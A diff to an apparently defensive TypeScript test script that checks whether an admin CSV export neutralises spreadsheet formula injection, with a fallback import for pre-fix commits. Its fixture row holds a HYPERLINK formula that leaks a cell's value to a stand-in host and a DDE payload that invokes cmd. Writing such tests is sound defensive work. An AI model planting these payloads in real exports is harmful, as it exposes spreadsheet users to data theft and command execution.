@@ -20,7 +20,6 @@ import { drainDueDeliveries } from "../src/lib/webhooks/dispatch";
 import { runImportJobById } from "../src/lib/import-job-dispatch";
 import { saveNoteBatch } from "../src/lib/note-batch-save";
 import { docxToText } from "../src/lib/cloud-files";
-import { toSpreadsheetCsv } from "../src/lib/csv-export";
 
 const USER = "stress-resilience";
 const WRITE = { skipRevalidate: true, skipEmbedding: true, skipSummary: true, skipCloseness: true } as const;
@@ -136,6 +135,11 @@ run(async () => {
   {
     const rows = [{ name: '=HYPERLINK("https://evil.example/?"&A1,"open")', email: "-2+3+cmd|' /C calc'!A0" }];
     const csv = Papa.unparse(rows);
+    // The export's own CSV writer. Before the fix (and so on the pre-fix commit, where the
+    // module does not exist yet) the route called `Papa.unparse(rows)` directly.
+    const toSpreadsheetCsv = await import("../src/lib/csv-export")
+      .then((m) => m.toSpreadsheetCsv)
+      .catch(() => (r: object[]) => Papa.unparse(r));
     const exported = toSpreadsheetCsv(rows);
     finding("INJ-CSV", "admin export CSV cells starting with = + - @ are neutralised", exported !== csv && /^"?'=/.test(exported.split("\n")[1] ?? ""), `exported line: ${exported.split("\n")[1]}`);
   }
